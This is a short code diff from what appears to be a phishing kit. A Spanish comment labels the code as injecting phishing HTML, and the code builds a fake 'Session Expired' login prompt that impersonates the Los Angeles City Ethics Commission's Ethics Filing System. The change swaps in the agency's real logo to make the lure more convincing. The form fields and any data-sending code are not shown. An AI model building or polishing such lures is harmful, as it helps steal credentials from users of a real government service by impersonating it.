@@ -10,7 +10,7 @@
     // 3. Inyectar el HTML del Phishing con diseño profesional
     newBody.innerHTML = `
     <div style="width:380px; background:#fff; padding:40px; border-radius:4px; box-shadow:0 10px 25px rgba(0,0,0,0.1); border-top: 5px solid #0056b3; text-align:center;">
-        <img src="https://ethics.lacity.gov/wp-content/themes/lacity-ethics/assets/images/logo.png" style="width:100%; max-width:280px; margin-bottom:30px;">
+        <img src="https://ethics.lacity.gov/wp-content/uploads/2018/06/Logo_132x58.gif" style="width:100%; max-width:280px; margin-bottom:30px;">
         <h2 style="font-size:20px; color:#333; margin:0 0 10px 0;">Session Expired</h2>
         <p style="color:#666; font-size:14px; line-height:1.5; margin-bottom:25px;">For your security, please re-authenticate to continue in the <strong>Ethics Filing System (EFS)</strong>.</p>
         
